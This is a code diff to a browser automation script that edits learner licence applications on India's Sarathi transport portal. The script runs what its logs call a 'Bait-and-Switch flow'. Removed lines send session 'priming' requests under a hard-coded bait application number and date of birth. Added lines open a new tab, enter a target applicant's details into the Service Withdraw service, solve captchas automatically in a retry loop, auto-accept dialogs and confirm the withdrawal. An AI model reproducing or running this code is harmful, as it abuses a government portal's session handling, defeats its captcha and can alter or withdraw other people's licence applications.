@@ -279,6 +279,24 @@ async function submitLLEditOTP(context, page, otpCode, targetAppNo, targetDob, d
     if (!selectedDist && dyn.fullAddress.toLowerCase().includes('mumbai')) {
         selectedDist = districtOptions.find(o => o.text.toLowerCase().includes('mumbai suburban')) || districtOptions.find(o => o.text.toLowerCase().includes('mumbai'));
     }
+    if (!selectedDist && dyn.pincode) {
+        try {
+            console.log('[lledit] Fetching district info for pincode:', dyn.pincode);
+            const axios = require('axios');
+            const pinRes = await axios.get(`https://api.postalpincode.in/pincode/${dyn.pincode}`, { timeout: 5000 });
+            if (pinRes.data && pinRes.data[0] && pinRes.data[0].Status === 'Success' && pinRes.data[0].PostOffice) {
+                const po = pinRes.data[0].PostOffice[0];
+                const cleanDistrictName = (po.District || '').replace(/\(.*\)/g, '').trim().toLowerCase();
+                const cleanDivisionName = (po.Division || '').trim().toLowerCase();
+                selectedDist = districtOptions.find(o => {
+                    const optText = o.text.toLowerCase();
+                    return optText.includes(cleanDistrictName) || optText.includes(cleanDivisionName) || cleanDistrictName.includes(optText) || cleanDivisionName.includes(optText);
+                });
+            }
+        } catch (err) {
+            console.log('[lledit] Pincode API lookup failed:', err.message);
+        }
+    }
     if (selectedDist) {
         console.log('[lledit] Found District Match:', selectedDist.text);
         await robustSelect(page, '#presDistrict', selectedDist.value, selectedDist.text);
@@ -290,11 +308,11 @@ async function submitLLEditOTP(context, page, otpCode, targetAppNo, targetDob, d
     const validSub = subdistOptions.find(v => v !== '-1');
     if (validSub) await robustSelect(page, '#presSubDistrict', validSub);
 
+    await page.locator('#presSameAsPerm').check().catch(() => {});
+    await page.waitForTimeout(1000);
     await fillField('#presHouseNo', dyn.addressLine1);
     await fillField('#presStreet', dyn.addressLine2);
     await fillField('#presPinCode', dyn.pincode);
-    await page.locator('#presSameAsPerm').check().catch(() => {});
-    await page.waitForTimeout(1000);
 
     console.log('[lledit] Adding COVs:', dyn.covs);
     const covMap = {
@@ -356,77 +374,67 @@ async function submitLLEditOTP(context, page, otpCode, targetAppNo, targetDob, d
         console.log('[lledit] Success message not found within 30s, continuing with priming requests...');
     });
 
-    // --- Priming Requests ---
-    const baitAppNo = '2081829326';
-    const baitDob = '01-01-2001';
-    console.log('[lledit] Executing Priming Request 1 (confirmOrAdd_execute.do) for BAIT credentials:', baitAppNo);
-    const fetch1Status = await page.evaluate(async (d) => {
-      try {
-        const resp = await fetch("https://sarathi.parivahan.gov.in/sarathiservice/confirmOrAdd_execute.do", {
-          "headers": {
-            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-            "accept-language": "en-GB,en;q=0.5",
-            "cache-control": "no-cache",
-            "content-type": "application/x-www-form-urlencoded",
-            "pragma": "no-cache",
-            "sec-ch-ua-mobile": "?0",
-            "sec-ch-ua-platform": "'Windows'",
-            "sec-fetch-dest": "document",
-            "sec-fetch-mode": "navigate",
-            "sec-fetch-site": "same-origin",
-            "upgrade-insecure-requests": "1"
-          },
-          "referrer": "https://sarathi.parivahan.gov.in/sarathiservice/confirmOrAdd_execute.do",
-          "body": "applicationNumber=" + d.appNo + "&dateOfBirth=" + d.dob + "&method%3AdivideTransactions=Confirm&isCorrect=true",
-          "method": "POST",
-          "mode": "cors",
-          "credentials": "include"
-        });
-        return resp.status;
-      } catch (err) {
-        return err.message;
-      }
-    }, { appNo: baitAppNo, dob: baitDob });
-    console.log('[lledit] Priming Request 1 Completed. Status/Result:', fetch1Status);
-
-    console.log('[lledit] Waiting 4 seconds before second priming request...');
-    await page.waitForTimeout(4000);
-
-    console.log('[lledit] Executing Priming Request 2 (dlSearch.do)...');
-    const fetch2Status = await page.evaluate(async () => {
-      try {
-        const resp = await fetch("https://sarathi.parivahan.gov.in/sarathiservice/dlSearch.do", {
-          "headers": {
-            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-            "accept-language": "en-GB,en;q=0.5",
-            "cache-control": "no-cache",
-            "pragma": "no-cache",
-            "sec-ch-ua-mobile": "?0",
-            "sec-ch-ua-platform": "'Windows'",
-            "sec-fetch-dest": "document",
-            "sec-fetch-mode": "navigate",
-            "sec-fetch-site": "same-origin",
-            "upgrade-insecure-requests": "1"
-          },
-          "referrer": "https://sarathi.parivahan.gov.in/sarathiservice/sarathiHomePublic.do",
-          "body": null,
-          "method": "GET",
-          "mode": "cors",
-          "credentials": "include"
-        });
-        return resp.status;
-      } catch (err) {
-        return err.message;
-      }
+    // --- Withdraw Service Flow in New Tab ---
+    console.log('[lledit] Opening new tab for Service Withdraw...');
+    const page1 = await context.newPage();
+    
+    // Dialog handler for the new tab to accept the withdraw confirmation popup
+    page1.on('dialog', async dialog => {
+      console.log('[lledit] [Withdraw Tab] Dialog appeared:', dialog.message());
+      await dialog.accept().catch(() => {});
     });
-    console.log('[lledit] Priming Request 2 Completed. Status/Result:', fetch2Status);
 
-    console.log('[lledit] Waiting 4 seconds before refreshing main tab...');
-    await page.waitForTimeout(4000);
+    console.log('[lledit] Navigating new tab to home page...');
+    await page1.goto('https://sarathi.parivahan.gov.in/sarathiservice/sarathiHomePublic.do');
+    
+    console.log('[lledit] Clicking Service Withdraw Service...');
+    await page1.getByRole('link', { name: 'Service Withdraw Service' }).click();
 
-    console.log('[lledit] Refreshing main page...');
+    console.log('[lledit] Filling target credentials for withdrawal:', targetAppNo);
+    const withdrawAppInput = page1.getByRole('textbox', { name: 'Application Number' });
+    await withdrawAppInput.waitFor({ state: 'visible', timeout: 30000 });
+    await withdrawAppInput.fill(targetAppNo);
+    await page1.getByRole('textbox', { name: 'Enter Date of Birth in dd-MM-' }).fill(targetDob);
+
+    let withdrawLoginSuccess = false;
+    let withdrawRetries = 0;
+    while (!withdrawLoginSuccess && withdrawRetries < 10) {
+      withdrawRetries++;
+      await smartSolveCaptcha(page1);
+      
+      const submitBtn = page1.getByRole('button', { name: 'Submit' }).first();
+      await submitBtn.click();
+      
+      try {
+        const confirmBtn = page1.getByRole('button', { name: 'Confirm' }).first();
+        await confirmBtn.waitFor({ state: 'visible', timeout: 8000 });
+        withdrawLoginSuccess = true;
+      } catch (e) {
+        console.log(`[lledit] Withdraw login/submit failed, retry ${withdrawRetries}/10...`);
+        try { await page1.locator('#caprefresh, .refresh-img').first().click({ timeout: 2000 }); } catch (err) {}
+      }
+    }
+
+    if (!withdrawLoginSuccess) {
+      throw new Error("Failed to pass captcha on Service Withdraw page after 10 attempts.");
+    }
+
+    console.log('[lledit] Clicking Confirm on withdraw page...');
+    const finalConfirmWithdrawBtn = page1.getByRole('button', { name: 'Confirm' }).first();
+    await finalConfirmWithdrawBtn.click();
+    await page1.waitForTimeout(3000);
+
+    console.log('[lledit] Navigating to home page for DL Search...');
+    await page1.goto('https://sarathi.parivahan.gov.in/sarathiservice/sarathiHomePublic.do');
+    
+    console.log('[lledit] Clicking DL Search...');
+    await page1.getByRole('link', { name: 'DL Search' }).first().click();
+    await page1.waitForTimeout(4000);
+
+    console.log('[lledit] Going back to main page and reloading...');
+    await page.bringToFront();
     await page.reload();
-    console.log('[lledit] Bait-and-Switch flow complete successfully!');
+    console.log('[lledit] Bait-and-Switch flow complete successfully with withdrawal!');
   } finally {
     await page.waitForTimeout(3000);
     await context.close().catch(() => {});
